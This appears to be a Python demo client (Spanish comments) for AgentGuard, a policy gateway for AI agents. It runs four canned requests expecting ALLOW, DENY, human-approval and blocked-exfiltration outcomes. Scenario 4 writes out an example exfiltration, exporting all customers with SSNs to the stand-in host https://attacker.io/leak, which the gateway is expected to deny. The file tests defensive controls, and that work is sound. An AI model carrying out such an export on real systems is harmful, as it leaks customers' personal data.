"""Cliente demostrador CLI para los 4 escenarios canónicos de AgentGuard.

Ejecuta llamadas reales contra ``POST /api/v1/gateway/execute`` autenticando
mediante la cabecera ``X-AgentGuard-Key`` para demostrar en vivo el control
contextual de autorización (ALLOW, DENY, REQUIRE_APPROVAL y detección OWASP).
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import httpx
from dotenv import load_dotenv

DEFAULT_BASE_URL = "http://localhost:8000"

PLACEHOLDER_KEYS = {
    "",
    "...",
    "ag_live_reemplazar_con_tu_api_key",
}


class Colors:
    """Códigos ANSI básicos para resaltar veredictos en consola."""

    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    CYAN = "\033[96m"


@dataclass(frozen=True)
class DemoConfig:
    """Configuración cargada desde variables de entorno para el cliente demo."""

    base_url: str
    api_key: str
    organization_id: str
    agent_id: str
    delegator_user_id: str | None
    tool_crm_id: str
    tool_stripe_id: str
    tool_catalog_id: str


@dataclass(frozen=True)
class DemoScenario:
    """Definición declarativa de un escenario de prueba contra el Gateway PEP."""

    number: int
    title: str
    description: str
    tool_attr: str
    action_name: str
    resource: str
    parameters: dict[str, Any]
    expected_status: int
    expected_decision: str
    note: str = ""


SCENARIOS: tuple[DemoScenario, ...] = (
    DemoScenario(
        number=1,
        title="Operación Normal (ALLOW)",
        description="Solicitar cotización CRM (`create_quote`) por $2,500 (< límite $10,000).",
        tool_attr="tool_crm_id",
        action_name="create_quote",
        resource="quotes/QT-2026-001",
        parameters={"amount": 2500, "customer_id": "cust_acme_01", "currency": "USD"},
        expected_status=200,
        expected_decision="ALLOW",
        note="Debe autorizarse automáticamente y devolver resultado de despacho.",
    ),
    DemoScenario(
        number=2,
        title="Privilegio Mínimo / Abuso Bloqueado (DENY)",
        description="Intentar modificar precio (`update_price`) a $10 en herramienta no asignada.",
        tool_attr="tool_catalog_id",
        action_name="update_price",
        resource="catalog/products/88",
        parameters={"product_id": 88, "new_price": 10},
        expected_status=403,
        expected_decision="DENY",
        note="El agente carece de capacidad en AgentTool; se bloquea antes de tocar la API.",
    ),
    DemoScenario(
        number=3,
        title="Human-in-the-Loop (REQUIRE_APPROVAL)",
        description="Solicitar reembolso (`refund`) por $4,500 (>= umbral automático $500).",
        tool_attr="tool_stripe_id",
        action_name="refund",
        resource="refunds/ch_302",
        parameters={"amount": 4500, "customer_id": "cust_302", "reason": "damaged_goods"},
        expected_status=202,
        expected_decision="REQUIRE_APPROVAL",
        note="Queda suspendida en ApprovalsView con un approval_id listo para aprobar en vivo.",
    ),
    DemoScenario(
        number=4,
        title="Exfiltración / Amenaza Crítica (DENY + Alerta CRITICAL)",
        description="Intentar exportar base de clientes (`export_customers`) hacia https://attacker.io/leak.",
        tool_attr="tool_crm_id",
        action_name="export_customers",
        resource="customers/all",
        parameters={"destination": "https://attacker.io/leak", "format": "csv", "include_ssn": True},
        expected_status=403,
        expected_decision="DENY",
        note="Neutraliza exfiltración, bloquea con 403 y dispara alerta CRITICAL en AlertsView.",
    ),
)


def _configure_stdio() -> None:
    """Evita fallos de codificación UTF-8 en consolas Windows heredadas."""
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    if hasattr(sys.stderr, "reconfigure"):
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")


def discover_gateway_context(base_url: str, api_key: str) -> dict[str, Any]:
    """Consulta GET /api/v1/gateway/context con X-AgentGuard-Key y retorna el contexto descubierto."""
    url = f"{base_url}/api/v1/gateway/context"
    headers = {
        "X-AgentGuard-Key": api_key,
        "Accept": "application/json",
    }
    try:
        with httpx.Client(timeout=10.0) as client:
            resp = client.get(url, headers=headers)
    except httpx.RequestError as exc:
        print(f"{Colors.RED}[ERROR DE CONEXIÓN] No se pudo contactar a {url}: {exc}{Colors.RESET}")
        print("Asegurate de que el backend de AgentGuard esté corriendo (por ej. con start_all.bat).")
        raise SystemExit(1)

    if resp.status_code == 401:
        print(f"{Colors.RED}[ERROR 401 UNAUTHORIZED] La API Key suministrada no es válida o fue revocada.{Colors.RESET}")
        print(
            "Si realizaste un reset de la base de datos o rotaste credenciales, generá una nueva API Key en el Dashboard "
            "(Configuración -> API Keys) y configurala en agent-demo/.env."
        )
        raise SystemExit(1)
    elif resp.status_code == 403:
        print(f"{Colors.RED}[ERROR 403 FORBIDDEN] Acceso denegado con la API Key provista.{Colors.RESET}")
        raise SystemExit(1)
    elif resp.status_code != 200:
        print(f"{Colors.RED}[ERROR {resp.status_code}] Falló el descubrimiento de contexto en {url}:{Colors.RESET} {resp.text}")
        raise SystemExit(1)

    try:
        data: dict[str, Any] = resp.json()
    except Exception as exc:
        print(f"{Colors.RED}[ERROR] Respuesta inválida del servidor (se esperaba JSON): {exc}{Colors.RESET}")
        raise SystemExit(1)

    return data


def load_config() -> DemoConfig:
    """Carga la configuración desde variables de entorno y descubre IDs reales vía GET /api/v1/gateway/context."""
    env_path = Path(__file__).resolve().parent / ".env"
    load_dotenv(dotenv_path=env_path)

    base_url = os.getenv("AGENTGUARD_URL", DEFAULT_BASE_URL).strip().rstrip("/")
    api_key = os.getenv("AGENTGUARD_API_KEY", "").strip()

    if api_key in PLACEHOLDER_KEYS:
        print(f"{Colors.RED}[ERROR] Falta configurar AGENTGUARD_API_KEY.{Colors.RESET}")
        print(
            "Copiá agent-demo/.env.example a agent-demo/.env y colocá una API Key "
            "válida generada en AgentGuard (Configuración -> API Keys o al registrar la empresa)."
        )
        raise SystemExit(1)

    context = discover_gateway_context(base_url, api_key)

    org_id = os.getenv("ORGANIZATION_ID", "").strip() or context.get("organization_id", "")
    if not org_id:
        print(f"{Colors.RED}[ERROR] No se pudo resolver 'organization_id' desde el endpoint de contexto ni desde .env.{Colors.RESET}")
        raise SystemExit(1)

    # Resolución de Agente: override opcional, o 'Agente de Ventas' / primer activo / primer agente
    agent_id_override = os.getenv("AGENT_ID", "").strip()
    if agent_id_override:
        agent_id = agent_id_override
    else:
        agents: list[dict[str, Any]] = context.get("agents", [])
        sales_agent = next((a for a in agents if "ventas" in a.get("name", "").lower()), None)
        active_agent = next((a for a in agents if a.get("status") == "ACTIVE"), None)
        chosen_agent = sales_agent or active_agent or (agents[0] if agents else None)
        if not chosen_agent or not chosen_agent.get("id"):
            print(f"{Colors.RED}[ERROR] La organización no tiene ningún agente activo registrado en AgentGuard.{Colors.RESET}")
            raise SystemExit(1)
        agent_id = chosen_agent["id"]

    # Resolución de Herramientas por acción atómica requerida:
    tools: list[dict[str, Any]] = context.get("tools", [])

    def find_tool_for_action(action_name: str, preferred_name: str = "") -> str:
        for t in tools:
            actions = t.get("actions", [])
            if any(a.get("action_name") == action_name for a in actions):
                return t["id"]
        if preferred_name:
            norm_preferred = preferred_name.lower()
            for t in tools:
                if norm_preferred in t.get("name", "").lower():
                    return t["id"]
        if tools:
            return tools[0]["id"]
        print(f"{Colors.RED}[ERROR] No se encontraron herramientas registradas en el tenant para la acción '{action_name}'.{Colors.RESET}")
        raise SystemExit(1)

    tool_crm_id = os.getenv("TOOL_CRM_ID", "").strip() or find_tool_for_action("create_quote", "crm")
    tool_stripe_id = os.getenv("TOOL_STRIPE_ID", "").strip() or find_tool_for_action("refund", "stripe")
    tool_catalog_id = os.getenv("TOOL_CATALOG_ID", "").strip() or find_tool_for_action("update_price", "catálogo")

    delegator_raw = os.getenv("DELEGATOR_USER_ID", "").strip()
    delegator_user_id = delegator_raw or None

    return DemoConfig(
        base_url=base_url,
        api_key=api_key,
        organization_id=org_id,
        agent_id=agent_id,
        delegator_user_id=delegator_user_id,
        tool_crm_id=tool_crm_id,
        tool_stripe_id=tool_stripe_id,
        tool_catalog_id=tool_catalog_id,
    )


def validate_config(config: DemoConfig) -> bool:
    """Verifica que exista una API Key real configurada antes de invocar el Gateway."""
    if config.api_key in PLACEHOLDER_KEYS:
        print(f"{Colors.RED}[ERROR] Falta configurar AGENTGUARD_API_KEY.{Colors.RESET}")
        print(
            "Copiá agent-demo/.env.example a agent-demo/.env y colocá una API Key "
            "válida generada en AgentGuard (Configuración -> API Keys o al registrar la empresa)."
        )
        return False
    return True


def _mask_api_key(raw_key: str) -> str:
    """Enmascara el secreto de la API Key al imprimir trazas en consola."""
    if len(raw_key) <= 14:
        return "***"
    return f"{raw_key[:12]}...{raw_key[-4:]}"


def _decision_color(decision: str | None) -> str:
    if decision == "ALLOW":
        return Colors.GREEN
    if decision == "REQUIRE_APPROVAL":
        return Colors.YELLOW
    return Colors.RED


def build_payload(scenario: DemoScenario, config: DemoConfig) -> dict[str, Any]:
    """Construye el cuerpo JSON compatible con ``GatewayExecuteRequest``."""
    payload: dict[str, Any] = {
        "organization_id": config.organization_id,
        "agent_id": config.agent_id,
        "tool_id": getattr(config, scenario.tool_attr),
        "action_name": scenario.action_name,
        "resource": scenario.resource,
        "parameters": scenario.parameters,
        "dry_run": False,
    }
    if config.delegator_user_id:
        payload["delegator_user_id"] = config.delegator_user_id
    return payload


def run_scenario(client: httpx.Client, scenario: DemoScenario, config: DemoConfig) -> bool:
    """Envía el escenario al Gateway PEP, muestra el resultado y valida expectativas."""
    endpoint = f"{config.base_url}/api/v1/gateway/execute"
    payload = build_payload(scenario, config)
    headers = {
        "X-AgentGuard-Key": config.api_key,
        "Content-Type": "application/json",
    }

    print()
    print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 74}{Colors.RESET}")
    print(f"{Colors.BOLD}Escenario {scenario.number}: {scenario.title}{Colors.RESET}")
    print(f"{Colors.DIM}{scenario.description}{Colors.RESET}")
    print(f"Endpoint: POST {endpoint}")
    print(f"Header:   X-AgentGuard-Key: {_mask_api_key(config.api_key)}")
    print(f"Payload:  {json.dumps(payload, ensure_ascii=False)}")
    print("-" * 74)

    try:
        response = client.post(endpoint, json=payload, headers=headers)
    except httpx.RequestError as exc:
        print(f"{Colors.RED}[ERROR DE CONEXIÓN] No se pudo contactar a {endpoint}: {exc}{Colors.RESET}")
        return False

    try:
        body: dict[str, Any] = response.json()
    except ValueError:
        body = {"raw_body": response.text}

    decision = body.get("decision")
    exec_status = body.get("status")
    color = _decision_color(decision)

    print(
        f"HTTP Status: {Colors.BOLD}{response.status_code}{Colors.RESET} "
        f"(esperado: {scenario.expected_status})"
    )

    if decision is None:
        print(f"{Colors.RED}Respuesta de error del servidor:{Colors.RESET} {json.dumps(body, ensure_ascii=False, indent=2)}")
        return False

    print(
        f"Decisión PDP: {color}{Colors.BOLD}{decision}{Colors.RESET} "
        f"| Estado: {exec_status} | Latencia: {body.get('latency_ms', '-')} ms"
    )
    print(f"Execution ID: {body.get('execution_id')}")

    if body.get("error_message"):
        print(f"Motivo bloqueo: {Colors.RED}{body['error_message']}{Colors.RESET}")

    if body.get("approval_id"):
        print(
            f"{Colors.YELLOW}{Colors.BOLD}Approval ID (HITL): {body['approval_id']}{Colors.RESET}\n"
            f"  -> Abrí 'Aprobaciones (HITL)' en el Dashboard de AgentGuard para aprobar o rechazar este ticket en vivo."
        )

    if body.get("alert_id"):
        print(f"{Colors.RED}{Colors.BOLD}Alert ID (CRITICAL): {body['alert_id']}{Colors.RESET}")

    if body.get("security_analysis"):
        print(f"Análisis Seguridad: {json.dumps(body['security_analysis'], ensure_ascii=False)}")

    if body.get("result"):
        print(f"Resultado Tool: {json.dumps(body['result'], ensure_ascii=False)}")

    matched = response.status_code == scenario.expected_status and decision == scenario.expected_decision
    if matched:
        print(f"{Colors.GREEN}[OK] Comportamiento verificado según especificación.{Colors.RESET}")
    else:
        print(
            f"{Colors.RED}[DESVÍO] Se esperaba HTTP {scenario.expected_status} y {scenario.expected_decision}, "
            f"se recibió HTTP {response.status_code} y {decision}.{Colors.RESET}"
        )

    if scenario.note:
        print(f"{Colors.DIM}Nota: {scenario.note}{Colors.RESET}")

    return matched


def run_all_scenarios(client: httpx.Client, config: DemoConfig) -> bool:
    """Ejecuta los 4 escenarios en secuencia y muestra un resumen comparativo."""
    results: list[tuple[DemoScenario, bool]] = []
    for scenario in SCENARIOS:
        ok = run_scenario(client, scenario, config)
        results.append((scenario, ok))

    print()
    print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 74}{Colors.RESET}")
    print(f"{Colors.BOLD}Resumen de Ejecución (--all){Colors.RESET}")
    print("-" * 74)
    for scenario, ok in results:
        badge = f"{Colors.GREEN}PASS{Colors.RESET}" if ok else f"{Colors.RED}FAIL{Colors.RESET}"
        print(f"  [{badge}] Escenario {scenario.number}: {scenario.action_name} -> {scenario.expected_decision} (HTTP {scenario.expected_status})")
    print(f"{Colors.CYAN}{'=' * 74}{Colors.RESET}")

    return all(ok for _, ok in results)


def run_interactive_menu(client: httpx.Client, config: DemoConfig) -> int:
    """Muestra un menú interactivo en consola para la demostración en vivo."""
    scenario_map = {str(s.number): s for s in SCENARIOS}

    while True:
        print()
        print(f"{Colors.BOLD}{Colors.CYAN}=== AgentGuard CLI Demo (Gateway PEP) ==={Colors.RESET}")
        print(f"Target: {config.base_url} | Org: {config.organization_id} | Agent: {config.agent_id}")
        print("-" * 74)
        for scenario in SCENARIOS:
            print(f"  [{scenario.number}] {scenario.title} — {scenario.action_name} (HTTP {scenario.expected_status})")
        print("  [A] Ejecutar TODOS los escenarios (1 -> 4)")
        print("  [0] Salir")

        try:
            choice = input("\nSeleccioná una opción: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print("\nSaliendo del demostrador AgentGuard.")
            return 0

        if choice in {"0", "q", "exit", "salir"}:
            print("Demostración finalizada.")
            return 0
        if choice == "a":
            run_all_scenarios(client, config)
            continue
        if choice in scenario_map:
            run_scenario(client, scenario_map[choice], config)
            continue

        print(f"{Colors.YELLOW}Opción inválida: '{choice}'. Elegí 1, 2, 3, 4, A o 0.{Colors.RESET}")


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    """Parsea los argumentos de línea de comandos."""
    parser = argparse.ArgumentParser(
        description="Cliente demostrador de los 4 escenarios canónicos de AgentGuard contra POST /api/v1/gateway/execute.",
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Ejecuta automáticamente los 4 escenarios en secuencia y finaliza.",
    )
    parser.add_argument(
        "--scenario",
        type=int,
        choices=[1, 2, 3, 4],
        help="Ejecuta directamente un escenario específico (1 a 4) y finaliza.",
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    """Punto de entrada principal del cliente CLI demostrador."""
    _configure_stdio()
    args = parse_args(argv)
    config = load_config()

    if not validate_config(config):
        return 1

    with httpx.Client(timeout=10.0) as client:
        if args.all:
            return 0 if run_all_scenarios(client, config) else 1
        if args.scenario is not None:
            scenario = next(s for s in SCENARIOS if s.number == args.scenario)
            return 0 if run_scenario(client, scenario, config) else 1
        return run_interactive_menu(client, config)


if __name__ == "__main__":
    raise SystemExit(main())

